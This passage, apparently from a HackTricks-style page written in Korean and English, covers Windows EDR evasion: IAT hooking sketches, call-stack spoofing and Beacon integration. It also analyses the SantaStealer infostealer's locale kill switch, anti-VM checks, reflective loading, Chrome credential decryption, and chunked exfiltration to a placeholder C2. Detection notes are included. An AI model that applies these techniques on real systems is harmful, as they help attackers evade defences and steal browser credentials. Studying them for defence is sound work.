- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
참고
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

운영 통합
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

탐지/DFIR 고려사항
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

관련 구성 요소 및 예시
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer)는 현대의 info-stealers가 AV bypass, anti-analysis 및 자격증명 접근을 단일 워크플로우로 결합하는 방식을 보여줍니다.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 계층화된 `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하고, 각 이름을 커스텀 롤링 체크섬으로 해시한 뒤 debuggers/sandboxes용 임베디드 차단 목록과 비교합니다; 컴퓨터 이름에 대해서도 체크섬을 반복하고 `C:\analysis`와 같은 작업 디렉터리를 확인합니다.
- Variant B는 시스템 속성(프로세스 수 하한, 최근 uptime)을 검사하고 `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox 추가 요소를 탐지하며, sleep 주변의 타이밍 체크로 single-stepping을 감지합니다. 어느 하나라도 일치하면 모듈이 실행되기 전에 중단합니다.

### 파일리스 헬퍼 + double ChaCha20 reflective loading

- 주된 DLL/EXE는 Chromium credential helper를 임베드하며, 이는 디스크에 드롭되거나 수동으로 메모리에 매핑됩니다; fileless 모드에서는 imports/relocations을 자체적으로 해결해 헬퍼 아티팩트가 파일로 기록되지 않습니다.
- 그 헬퍼는 2단계 DLL을 ChaCha20으로 두 번(32-byte 키 2개 + 12-byte nonce) 암호화하여 저장합니다. 두 번의 패스가 끝나면 블랍을 reflective로 로드(즉 `LoadLibrary` 미사용)하고 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`를 호출합니다.
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 실행 중인 Chromium 브라우저에 인젝션하고, AppBound Encryption 키를 상속받아 ABE hardening에도 불구하고 SQLite 데이터베이스에서 바로 비밀번호/쿠키/신용카드를 복호화합니다.

### 모듈형 인메모리 수집 & 청크 단위 HTTP exfil

- `create_memory_based_log`는 전역 `memory_generators` 함수 포인터 테이블을 반복하며, 활성화된 모듈(예: Telegram, Discord, Steam, 스크린샷, 문서, 브라우저 확장 등)마다 한 개의 스레드를 생성합니다. 각 스레드는 결과를 공유 버퍼에 쓰고 약 ~45s의 join 창 이후 파일 개수를 보고합니다.
- 완료되면 모든 결과를 정적으로 링크된 `miniz` 라이브러리로 `%TEMP%\\Log.zip`으로 압축합니다. `ThreadPayload1`은 15s 동안 sleep한 뒤 아카이브를 10 MB 청크로 나누어 HTTP POST로 `http://<C2>:6767/upload`에 스트리밍하며 브라우저 `multipart/form-data` 경계(`----WebKitFormBoundary***`)를 스푸핑합니다. 각 청크에는 `User-Agent: upload`, `auth: <build_id>`, 선택적 `w: <campaign_tag>`가 추가되며 마지막 청크는 `complete: true`를 붙여 C2가 재조립 완료를 인지하도록 합니다.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
